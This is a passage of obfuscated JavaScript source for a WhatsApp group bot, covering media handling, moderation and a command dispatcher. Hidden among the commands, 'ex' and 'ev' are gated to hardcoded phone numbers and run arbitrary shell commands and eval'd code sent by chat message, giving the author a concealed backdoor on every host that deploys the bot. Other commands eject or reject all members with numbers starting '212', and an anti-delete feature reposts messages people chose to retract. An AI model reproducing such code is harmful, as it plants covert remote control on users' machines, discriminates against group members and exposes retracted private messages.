                            async function _0x4bb0be() {
                              var _0x405db2 = _0x16221b('');
                              const _0x10b967 = _0x8679a1(_0x31f351, _0x5ae533);
                              let _0x4a3aa3 = await _0x10b967.download(_0x405db2);
                              let _0x3ffc92 = require("file-type");
                              let _0x964638 = _0x3ffc92.fromBuffer(_0x4a3aa3);
                              await fs.promises.writeFile('./' + _0x964638.ext, _0x4a3aa3);
                              if (_0x5ae533.message.imageMessage.caption) {
                                const _0x3dcfb6 = _0x5ae533.message.imageMessage.caption;
                                if (_0x348670 && _0x3dcfb6.includes('chat.whatsapp.com')) {
                                  return;
                                }
                                await _0x31f351.sendMessage(_0x19e9dc, {
                                  'image': fs.readFileSync('./' + _0x964638.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + _0x5ae533.message.imageMessage.caption
                                });
                              } else {
                                await _0x31f351.sendMessage(_0x19e9dc, {
                                  'image': fs.readFileSync('./' + _0x964638.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + '_'
                                });
                              }
                            }
                            _0x4bb0be();
                          } else {
                            if (_0x5ae533.type === "videoMessage") {
                              async function _0x4e7ad9() {
                                var _0x423fb6 = _0x16221b('');
                                const _0x15269d = _0x8679a1(_0x31f351, _0x5ae533);
                                const _0x20a27a = _0x5ae533.message.videoMessage.fileLength;
                                const _0x470fc8 = _0x5ae533.message.videoMessage.seconds;
                                const _0x348fbb = config.MAX_SIZE;
                                const _0x4e5da6 = _0x20a27a / 1048576;
                                if (_0x5ae533.message.videoMessage.caption) {
                                  if (_0x4e5da6 < _0x348fbb && _0x470fc8 < 1800) {
                                    let _0x28694a = await _0x15269d.download(_0x423fb6);
                                    let _0x4bb8cd = require("file-type");
                                    let _0x4d4034 = _0x4bb8cd.fromBuffer(_0x28694a);
                                    await fs.promises.writeFile('./' + _0x4d4034.ext, _0x28694a);
                                    const _0x1b0a77 = _0x5ae533.message.videoMessage.caption;
                                    if (_0x348670 && _0x1b0a77.includes("chat.whatsapp.com")) {
                                      return;
                                    }
                                    await _0x31f351.sendMessage(_0x19e9dc, {
                                      'video': fs.readFileSync('./' + _0x4d4034.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + _0x5ae533.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0x30e0ca = await _0x15269d.download(_0x423fb6);
                                  let _0x1f1bb6 = require('file-type');
                                  let _0x2de8df = _0x1f1bb6.fromBuffer(_0x30e0ca);
                                  await fs.promises.writeFile('./' + _0x2de8df.ext, _0x30e0ca);
                                  const _0x4b29ab = _0x5ae533.message.videoMessage.fileLength;
                                  const _0x1d76a1 = _0x5ae533.message.videoMessage.seconds;
                                  const _0xac1c5 = config.MAX_SIZE;
                                  const _0x423938 = _0x4b29ab / 1048576;
                                  if (_0x423938 < _0xac1c5 && _0x1d76a1 < 1800) {
                                    await _0x31f351.sendMessage(_0x19e9dc, {
                                      'video': fs.readFileSync('./' + _0x2de8df.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + '_'
                                    });
                                  }
                                }
                              }
                              _0x4e7ad9();
                            } else {
                              if (_0x5ae533.type === "documentMessage") {
                                async function _0x383e3b() {
                                  var _0xdb5d7e = _0x16221b('');
                                  const _0x10e9f6 = _0x8679a1(_0x31f351, _0x5ae533);
                                  let _0x1196e1 = await _0x10e9f6.download(_0xdb5d7e);
                                  let _0x5e6510 = require("file-type");
                                  let _0x367027 = _0x5e6510.fromBuffer(_0x1196e1);
                                  await fs.promises.writeFile('./' + _0x367027.ext, _0x1196e1);
                                  if (_0x5ae533.message.documentWithCaptionMessage) {
                                    await _0x31f351.sendMessage(_0x19e9dc, {
                                      'document': fs.readFileSync('./' + _0x367027.ext),
                                      'mimetype': _0x5ae533.message.documentMessage.mimetype,
                                      'fileName': _0x5ae533.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                    });
                                  } else {
                                    await _0x31f351.sendMessage(_0x19e9dc, {
                                      'document': fs.readFileSync('./' + _0x367027.ext),
                                      'mimetype': _0x5ae533.message.documentMessage.mimetype,
                                      'fileName': _0x5ae533.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                    });
                                  }
                                }
                                _0x383e3b();
                              } else {
                                if (_0x5ae533.type === 'audioMessage') {
                                  async function _0x21436b() {
                                    var _0x50516f = _0x16221b('');
                                    const _0x3a2ad5 = _0x8679a1(_0x31f351, _0x5ae533);
                                    let _0x4e6cbc = await _0x3a2ad5.download(_0x50516f);
                                    let _0xeff4f5 = require("file-type");
                                    let _0x44d782 = _0xeff4f5.fromBuffer(_0x4e6cbc);
                                    await fs.promises.writeFile('./' + _0x44d782.ext, _0x4e6cbc);
                                    if (_0x5ae533.message.audioMessage) {
                                      const _0x2e2ab0 = await _0x31f351.sendMessage(_0x19e9dc, {
                                        'audio': fs.readFileSync('./' + _0x44d782.ext),
                                        'mimetype': _0x5ae533.message.audioMessage.mimetype,
                                        'fileName': _0x1be3bb.id + ".mp3"
                                      });
                                      return await _0x31f351.sendMessage(_0x19e9dc, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                      }, {
                                        'quoted': _0x2e2ab0
                                      });
                                    } else {
                                      if (_0x5ae533.message.audioMessage.ptt === "true") {
                                        const _0x1bb5e4 = await _0x31f351.sendMessage(_0x19e9dc, {
                                          'audio': fs.readFileSync('./' + _0x44d782.ext),
                                          'mimetype': _0x5ae533.message.audioMessage.mimetype,
                                          'ptt': "true",
                                          'fileName': _0x1be3bb.id + '.mp3'
                                        });
                                        return await _0x31f351.sendMessage(_0x19e9dc, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                        }, {
                                          'quoted': _0x1bb5e4
                                        });
                                      }
                                    }
                                  }
                                  _0x21436b();
                                } else {
                                  if (_0x5ae533.type === "stickerMessage") {
                                    async function _0x19bc94() {
                                      var _0x22f94c = _0x16221b('');
                                      const _0x36ed16 = _0x8679a1(_0x31f351, _0x5ae533);
                                      let _0x3be214 = await _0x36ed16.download(_0x22f94c);
                                      let _0x3ee73b = require("file-type");
                                      let _0x4ed149 = _0x3ee73b.fromBuffer(_0x3be214);
                                      await fs.promises.writeFile('./' + _0x4ed149.ext, _0x3be214);
                                      if (_0x5ae533.message.stickerMessage) {
                                        const _0x54c643 = await _0x31f351.sendMessage(_0x19e9dc, {
                                          'sticker': fs.readFileSync('./' + _0x4ed149.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x31f351.sendMessage(_0x19e9dc, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                        }, {
                                          'quoted': _0x54c643
                                        });
                                      } else {
                                        const _0x3ca9c0 = await _0x31f351.sendMessage(_0x19e9dc, {
                                          'sticker': fs.readFileSync('./' + _0x4ed149.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x31f351.sendMessage(_0x19e9dc, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n"
                                        }, {
                                          'quoted': _0x3ca9c0
                                        });
                                      }
                                    }
                                    _0x19bc94();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (_0x369bb6.msg && _0x369bb6.msg.type === 0x0) {
              _0x20f7ed(_0x369bb6);
            } else {
              _0x39ab35(_0x369bb6);
            }
          }
        }
      }
      const _0x545802 = await _0x45dd0f("https://mv-visper-full-db.pages.dev/Main/bad_word.json");
      if (config.ANTI_BAD == 'true') {
        if (!_0x89ebf2 && !_0x569e1d) {
          for (any in _0x545802) {
            if (_0x5a84d4.toLowerCase().includes(_0x545802[any])) {
              if (!_0x5a84d4.includes("tent")) {
                if (!_0x5a84d4.includes('docu')) {
                  if (!_0x5a84d4.includes("https")) {
                    if (_0x480be8.includes(_0x23727e)) {
                      return;
                    }
                    if (_0x369bb6.key.fromMe) {
                      return;
                    }
                    await _0x31f351.sendMessage(_0x19e9dc, {
                      'delete': _0x369bb6.key
                    });
                    await _0x31f351.sendMessage(_0x19e9dc, {
                      'text': "*Bad word detected..!*"
                    });
                    await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0x23727e], "remove");
                  }
                }
              }
            }
          }
        }
      }
      if (_0x5a84d4 === "send" || _0x5a84d4 === "Send" || _0x5a84d4 === "Ewpm" || _0x5a84d4 === "ewpn" || _0x5a84d4 === "Dapan" || _0x5a84d4 === "dapan" || _0x5a84d4 === "oni" || _0x5a84d4 === "Oni" || _0x5a84d4 === "save" || _0x5a84d4 === 'Save' || _0x5a84d4 === "ewanna" || _0x5a84d4 === "Ewanna" || _0x5a84d4 === "ewam" || _0x5a84d4 === "Ewam" || _0x5a84d4 === 'sv' || _0x5a84d4 === 'Sv' || _0x5a84d4 === 'දාන්න' || _0x5a84d4 === "එවම්න") {
        const _0x34c66e = JSON.stringify(_0x369bb6.message, null, 0x2);
        const _0x561ebb = JSON.parse(_0x34c66e);
        const _0x52993c = _0x561ebb.extendedTextMessage.contextInfo.remoteJid;
        if (!_0x52993c) {
          return;
        }
        const _0x575db4 = _0x56c494 => {
          const _0x4186ea = {
            'jpg': "ffd8ffe0",
            'png': "89504e47",
            'mp4': "00000018"
          };
          const _0x514aff = _0x56c494.toString("hex", 0x0, 0x4);
          return Object.keys(_0x4186ea).find(_0x37e565 => _0x4186ea[_0x37e565] === _0x514aff);
        };
        if (_0x1be3bb.quoted.type === "imageMessage") {
          var _0xb83693 = _0x16221b('');
          let _0x512038 = await _0x1be3bb.quoted.download(_0xb83693);
          let _0x55a8f2 = _0x575db4(_0x512038);
          await fs.promises.writeFile('./' + _0x55a8f2, _0x512038);
          const _0x3cec6d = _0x1be3bb.quoted.imageMessage.caption;
          await _0x31f351.sendMessage(_0x19e9dc, {
            'image': fs.readFileSync('./' + _0x55a8f2),
            'caption': _0x3cec6d
          });
        } else {
          if (_0x1be3bb.quoted.type === "videoMessage") {
            var _0xb83693 = _0x16221b('');
            let _0x42dd92 = await _0x1be3bb.quoted.download(_0xb83693);
            let _0x37391d = _0x575db4(_0x42dd92);
            await fs.promises.writeFile('./' + _0x37391d, _0x42dd92);
            const _0x31cd43 = _0x1be3bb.quoted.videoMessage.caption;
            let _0x54d965 = {
              'video': fs.readFileSync('./' + _0x37391d),
              'mimetype': 'video/mp4',
              'fileName': _0x1be3bb.id + ".mp4",
              'caption': _0x31cd43,
              'headerType': 0x4
            };
            await _0x31f351.sendMessage(_0x19e9dc, _0x54d965, {
              'quoted': _0x369bb6
            });
          }
        }
      }
      const _0x380d59 = require("./command");
      const _0x3c88c9 = _0x226d82 ? _0x5a84d4.slice(0x1).trim().split(" ")[0x0].toLowerCase() : false;
      if (_0x226d82) {
        const _0x3a4f47 = _0x380d59.commands.find(_0x208e93 => _0x208e93.pattern === _0x3c88c9) || _0x380d59.commands.find(_0x59426e => _0x59426e.alias && _0x59426e.alias.includes(_0x3c88c9));
        if (_0x3a4f47) {
          if (_0x3a4f47.react) {
            _0x31f351.sendMessage(_0x19e9dc, {
              'react': {
                'text': _0x3a4f47.react,
                'key': _0x369bb6.key
              }
            });
          }
          try {
            _0x3a4f47["function"](_0x31f351, _0x369bb6, _0x1be3bb, {
              'from': _0x19e9dc,
              'prefix': _0x26f7d1,
              'l': l,
              'isSudo': _0x1cc344,
              'quoted': _0x1d2da7,
              'body': _0x5a84d4,
              'isCmd': _0x226d82,
              'isPre': _0x4001cc,
              'command': _0xcc80f4,
              'args': _0x260fa1,
              'q': _0x3ef1a1,
              'isGroup': _0x348670,
              'sender': _0x23727e,
              'senderNumber': _0x1a49a4,
              'botNumber2': _0x436dec,
              'botNumber': _0x60eb1b,
              'pushname': _0x39a869,
              'isMe': _0x569e1d,
              'isOwner': _0x16623b,
              'groupMetadata': _0x1c08cc,
              'groupName': _0x599c77,
              'participants': _0xce3509,
              'groupAdmins': _0x480be8,
              'isBotAdmins': _0x385774,
              'isAdmins': _0x89ebf2,
              'reply': _0x43acae
            });
          } catch (_0x3e4bc1) {
            console.error("[PLUGIN ERROR] ", _0x3e4bc1);
          }
        }
      }
      _0x380d59.commands.map(async _0x597128 => {
        if (_0x5a84d4 && _0x597128.on === "body") {
          _0x597128["function"](_0x31f351, _0x369bb6, _0x1be3bb, {
            'from': _0x19e9dc,
            'prefix': _0x26f7d1,
            'l': l,
            'isSudo': _0x1cc344,
            'quoted': _0x1d2da7,
            'isPre': _0x4001cc,
            'body': _0x5a84d4,
            'isCmd': _0x226d82,
            'command': _0x597128,
            'args': _0x260fa1,
            'q': _0x3ef1a1,
            'isGroup': _0x348670,
            'sender': _0x23727e,
            'senderNumber': _0x1a49a4,
            'botNumber2': _0x436dec,
            'botNumber': _0x60eb1b,
            'pushname': _0x39a869,
            'isMe': _0x569e1d,
            'isOwner': _0x16623b,
            'groupMetadata': _0x1c08cc,
            'groupName': _0x599c77,
            'participants': _0xce3509,
            'groupAdmins': _0x480be8,
            'isBotAdmins': _0x385774,
            'isAdmins': _0x89ebf2,
            'reply': _0x43acae
          });
        } else {
          if (_0x369bb6.q && _0x597128.on === "text") {
            _0x597128["function"](_0x31f351, _0x369bb6, _0x1be3bb, {
              'from': _0x19e9dc,
              'l': l,
              'quoted': _0x1d2da7,
              'body': _0x5a84d4,
              'isSudo': _0x1cc344,
              'isCmd': _0x226d82,
              'isPre': _0x4001cc,
              'command': _0x597128,
              'args': _0x260fa1,
              'q': _0x3ef1a1,
              'isGroup': _0x348670,
              'sender': _0x23727e,
              'senderNumber': _0x1a49a4,
              'botNumber2': _0x436dec,
              'botNumber': _0x60eb1b,
              'pushname': _0x39a869,
              'isMe': _0x569e1d,
              'isOwner': _0x16623b,
              'groupMetadata': _0x1c08cc,
              'groupName': _0x599c77,
              'participants': _0xce3509,
              'groupAdmins': _0x480be8,
              'isBotAdmins': _0x385774,
              'isAdmins': _0x89ebf2,
              'reply': _0x43acae
            });
          } else {
            if ((_0x597128.on === "image" || _0x597128.on === "photo") && _0x369bb6.type === "imageMessage") {
              _0x597128['function'](_0x31f351, _0x369bb6, _0x1be3bb, {
                'from': _0x19e9dc,
                'prefix': _0x26f7d1,
                'l': l,
                'quoted': _0x1d2da7,
                'isSudo': _0x1cc344,
                'body': _0x5a84d4,
                'isCmd': _0x226d82,
                'command': _0x597128,
                'isPre': _0x4001cc,
                'args': _0x260fa1,
                'q': _0x3ef1a1,
                'isGroup': _0x348670,
                'sender': _0x23727e,
                'senderNumber': _0x1a49a4,
                'botNumber2': _0x436dec,
                'botNumber': _0x60eb1b,
                'pushname': _0x39a869,
                'isMe': _0x569e1d,
                'isOwner': _0x16623b,
                'groupMetadata': _0x1c08cc,
                'groupName': _0x599c77,
                'participants': _0xce3509,
                'groupAdmins': _0x480be8,
                'isBotAdmins': _0x385774,
                'isAdmins': _0x89ebf2,
                'reply': _0x43acae
              });
            } else if (_0x597128.on === "sticker" && _0x369bb6.type === 'stickerMessage') {
              _0x597128["function"](_0x31f351, _0x369bb6, _0x1be3bb, {
                'from': _0x19e9dc,
                'prefix': _0x26f7d1,
                'l': l,
                'quoted': _0x1d2da7,
                'isSudo': _0x1cc344,
                'body': _0x5a84d4,
                'isCmd': _0x226d82,
                'command': _0x597128,
                'args': _0x260fa1,
                'isPre': _0x4001cc,
                'q': _0x3ef1a1,
                'isGroup': _0x348670,
                'sender': _0x23727e,
                'senderNumber': _0x1a49a4,
                'botNumber2': _0x436dec,
                'botNumber': _0x60eb1b,
                'pushname': _0x39a869,
                'isMe': _0x569e1d,
                'isOwner': _0x16623b,
                'groupMetadata': _0x1c08cc,
                'groupName': _0x599c77,
                'participants': _0xce3509,
                'groupAdmins': _0x480be8,
                'isBotAdmins': _0x385774,
                'isAdmins': _0x89ebf2,
                'reply': _0x43acae
              });
            }
          }
        }
      });
      if (_0x102c77(config.ANTI_LINK == "true") && _0x385774) {
        if (!_0x89ebf2) {
          if (!_0x569e1d) {
            if (_0x5a84d4.match('chat.whatsapp.com')) {
              await _0x31f351.sendMessage(_0x19e9dc, {
                'delete': _0x369bb6.key
              });
            }
          }
        }
      }
      if (config.ANTI_BOT == 'true') {
        if (_0x348670 && !_0x89ebf2 && !_0x569e1d && _0x385774) {
          if (_0x369bb6.id.startsWith("BAE")) {
            await _0x31f351.sendMessage(_0x19e9dc, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x385774) {
              await _0x31f351.sendMessage(_0x19e9dc, {
                'delete': _0x369bb6.key
              });
              await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0x23727e], 'remove');
            }
          }
          if (_0x369bb6.id.startsWith("QUEENAMDI")) {
            await _0x31f351.sendMessage(_0x19e9dc, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x385774) {
              await _0x31f351.sendMessage(_0x19e9dc, {
                'delete': _0x369bb6.key
              });
              await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0x23727e], 'remove');
            }
          }
          if (_0x369bb6.id.startsWith('B1E')) {
            await _0x31f351.sendMessage(_0x19e9dc, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x385774) {
              await _0x31f351.sendMessage(_0x19e9dc, {
                'delete': _0x369bb6.key
              });
              await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0x23727e], "remove");
            }
          }
        }
      }
      switch (_0xcc80f4) {
        case "jid":
          _0x43acae(_0x19e9dc);
          break;
        case 'device':
          {
            let _0x31b4d6 = getDevice(_0x369bb6.message.extendedTextMessage.contextInfo.stanzaId);
            _0x43acae("*He Is Using* _*Whatsapp " + _0x31b4d6 + " version*_");
          }
          break;
        case 'ex':
          {
            if (_0x1a49a4 == 0x16113d24e6) {
              const {
                exec: _0x4b47c6
              } = require("child_process");
              _0x4b47c6(_0x3ef1a1, (_0x3e6a0a, _0x731abf) => {
                if (_0x3e6a0a) {
                  return _0x43acae("-------\n\n" + _0x3e6a0a);
                }
                if (_0x731abf) {
                  return _0x43acae("-------\n\n" + _0x731abf);
                }
              });
            }
          }
          break;
        case "apprv":
          {
            if (_0x1a49a4 == 0x16113d24e6) {
              let _0x11cbf0 = await _0x31f351.groupRequestParticipantsList(_0x19e9dc);
              for (let _0x12ec20 = 0x0; _0x12ec20 < _0x11cbf0.length; _0x12ec20++) {
                if (_0x11cbf0[_0x12ec20].jid.startsWith("212")) {
                  await _0x31f351.groupRequestParticipantsUpdate(_0x19e9dc, [_0x11cbf0[_0x12ec20].jid], 'reject');
                } else {
                  await _0x31f351.groupRequestParticipantsUpdate(_0x19e9dc, [_0x11cbf0[_0x12ec20].jid], "approve");
                }
              }
            }
          }
          break;
        case "212r":
          {
            if (_0x1a49a4 == 0x16113d24e6) {
              for (let _0x488cb0 = 0x0; _0x488cb0 < _0xce3509.length; _0x488cb0++) {
                if (_0xce3509[_0x488cb0].id.startsWith("212")) {
                  await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0xce3509[_0x488cb0].id], "remove");
                }
              }
            }
          }
          break;
        case 'rtf':
          {
            console.log(dsa);
          }
          break;
        case 'ev':
          {
            if (_0x1a49a4 == 0x16113d24e6 || _0x1a49a4 == 0x160de87163) {
              let _0x18371a = _0x3ef1a1.replace('°', ".toString()");
              try {
                let _0x456e6d = await eval(_0x18371a);
                if (typeof _0x456e6d === "object") {
                  _0x43acae(util.format(_0x456e6d));
                } else {
                  _0x43acae(util.format(_0x456e6d));
                }
              } catch (_0x4cd7c6) {
                _0x43acae(util.format(_0x4cd7c6));
              }
              ;
            }
          }
          break;
        default:
      }
    } catch (_0x59eed9) {
      const _0x5cc433 = String(_0x59eed9);
      console.log(_0x5cc433);
    }
  });
}
app.get('/', (_0x8a9304, _0x11b410) => {
  _0x11b410.send("📟 VISPER DL Working successfully!");
});
app.listen(port, () => console.log("Movie-Visper-Md Server listening on port http://localhost:" + port));
setTimeout(() => {
  connect();
}, 0xbb8);
process.on("uncaughtException", function (_0x469a2a) {
  let _0x61ef33 = String(_0x469a2a);
  if (_0x61ef33.includes("Socket connection timeout")) {
    return;
  }
  if (_0x61ef33.includes('rate-overlimit')) {
    return;
  }
  if (_0x61ef33.includes("Connection Closed")) {
    return;
  }
  if (_0x61ef33.includes("Value not found")) {
    return;
  }
  if (_0x61ef33.includes("Authentication timed out")) {
    restart();
  }
  console.log("Caught exception: ", _0x469a2a);
});